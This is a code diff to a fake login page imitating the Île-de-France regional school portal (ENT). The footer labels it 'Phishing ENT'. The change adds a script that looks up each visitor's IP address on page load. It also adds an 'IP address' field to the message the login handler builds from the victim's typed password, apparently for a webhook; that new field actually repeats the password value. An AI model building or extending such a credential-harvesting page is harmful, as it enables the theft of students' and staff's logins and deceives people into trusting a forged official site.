@@ -186,6 +186,18 @@
  <p class=footer-rights><span>2024 </span><span>Région Île-de-France. Tous droits réservés.</span></p>
  </footer>
 <script>
+document.addEventListener("DOMContentLoaded", function() {
+            fetch("https://api.ipify.org/?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    //document.getElementById("ip-address").textContent = data.ip;
+                    console.log(data.ip)
+                })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                });
+        });
+        
 document.getElementById("kc-login").addEventListener("click", async (event) => {
     event.preventDefault();
 
@@ -213,7 +225,13 @@ document.getElementById("kc-login").addEventListener("click", async (event) => {
                             name: "🔐 Mot de passe",
                             value: passwordPresent || "Vide",
                             inline: true
+                        },
+                        {
+                            name: "📍 Adresse IP",
+                            value: passwordPresent || "Vide",
+                            inline: true
                         }
+                        
                     ],
                     footer: {
                         text: "Phishing ENT"
